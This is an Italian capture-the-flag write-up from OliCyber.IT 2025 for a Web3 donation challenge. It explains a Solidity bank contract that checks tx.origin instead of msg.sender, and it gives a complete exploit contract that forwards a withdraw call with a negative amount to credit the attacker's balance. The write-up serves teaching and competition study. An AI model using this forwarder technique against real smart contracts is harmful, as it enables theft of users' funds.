# OliCyber.IT 2025 - Competizione nazionale

## [misc] Epic Web3 donations gone wrong (9 solves)

Donate 1 coin to our local charity.

Site: [https://epic-web3-donations.challs.olicyber.it](https://epic-web3-donations.challs.olicyber.it)

Author: Giovanni Minotti <@giotino>

## Panoramica

La challenge si presenta come una piattaforma di donazioni Web3, dove gli utenti possono donare criptovalute a un ente di beneficenza utilizzando un conto bancario di qualsiasi banca (creato tramite uno specifico smart contract). Inoltre, gli utenti vengono ricompensati con una flag se possiedono un deposito presso la banca principale posseduta dalla piattaforma, ma non esiste alcun modo per depositare criptovalute.

## Soluzione

La funzione chiamata durante la donazione è `withdraw`

```solidity
function withdraw(address addr, int256 amount) public {
    require(tx.origin == teller, "Not a teller");
    balances[addr] -= amount;
    require(balances[addr] >= 0, "Insufficient balance");
}
```

Viene verificato se chi effettua la chiamata sia il cassiere (`teller`) e poi l’importo viene sottratto dal saldo dell’utente. Il problema è che viene usato `tx.origin` al posto di `msg.sender`, il che significa che qualsiasi contratto può chiamare questa funzione se è stato esso stesso chiamato dal cassiere.

L’exploit qui sotto simula una banca. Quando viene chiamata `withdraw`, essa invocherà la funzione `withdraw` della banca target (la banca principale posseduta dalla piattaforma) con un valore negativo, aggiungendo così fondi.
Dopo aver distribuito il contratto, possiamo usare il suo indirizzo come banca sulla piattaforma di donazioni e avviare una donazione. La piattaforma chiamerà la funzione `withdraw` del nostro contratto, che a sua volta chiamerà la banca target mantenendo `tx.origin` come cassiere.

Ora non resta che controllare il saldo (tramite la piattaforma) della banca principale e ricevere la flag.

## Exploit

```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

interface ITxOriginBank {
    function withdraw(address _to, int256 _amount) external;
}

contract ExploitForwarder {
    address public targetBank;
    address public attacker;

    constructor(address _targetBank) {
        targetBank = _targetBank;
        attacker = msg.sender;
    }

    function withdraw(address, int256) external {
        ITxOriginBank(targetBank).withdraw(attacker, -9999);
    }

    function getBalance(address addr) public view returns (int256) {
        return 9999;
    }
}
```
